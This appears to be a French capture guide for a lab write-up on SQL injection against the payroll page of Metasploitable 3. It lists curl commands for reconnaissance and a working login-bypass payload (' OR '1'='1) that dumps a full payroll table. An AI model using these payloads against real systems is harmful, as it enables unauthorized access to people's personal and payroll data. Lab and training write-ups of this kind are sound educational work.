# Captures — Payroll App SQLi (MS3)

Consignes de capture pour `services/ms3-payroll-sqli.html`. Commandes identiques à celles du
write-up source : `ms3/jules/payroll-sqli.md`.

## 01-recon-form.png

```bash
curl -s http://172.28.128.3/payroll_app.php
curl -sI http://172.28.128.3/payroll_app.php
```

Encadrer en rouge : `X-Powered-By: PHP/5.4.5`.

## 02-injection-sql.png

Les deux requêtes à la suite (admin/admin puis l'injection) :
```bash
curl -s -X POST http://172.28.128.3/payroll_app.php -d "user=admin&password=admin&s=OK"
curl -s -X POST http://172.28.128.3/payroll_app.php --data-urlencode "user=' OR '1'='1" --data-urlencode "password=' OR '1'='1" -d "s=OK"
```

Encadrer en rouge : la différence entre les deux résultats (table vide vs table pleine).

## 03-dump-table.png

Sortie complète de la deuxième commande ci-dessus (les 15 lignes).

Encadrer en rouge : aucun — l'intérêt est de montrer la liste complète, pas une ligne en
particulier.
